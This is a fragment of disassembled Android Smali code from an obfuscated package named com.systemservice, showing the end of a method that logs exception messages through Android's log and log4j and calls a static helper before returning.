    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_8
    .catchall {:try_start_10 .. :try_end_10} :catchall_1

    :cond_b
    :goto_5
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    goto :goto_7

    :catchall_1
    move-exception v0

    goto :goto_6

    :catch_8
    move-exception v0

    :try_start_11
    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v3}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v3}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_11
    .catchall {:try_start_11 .. :try_end_11} :catchall_1

    goto :goto_5

    :goto_6
    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v3, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0

    :cond_c
    :goto_7
    return-void
.end method
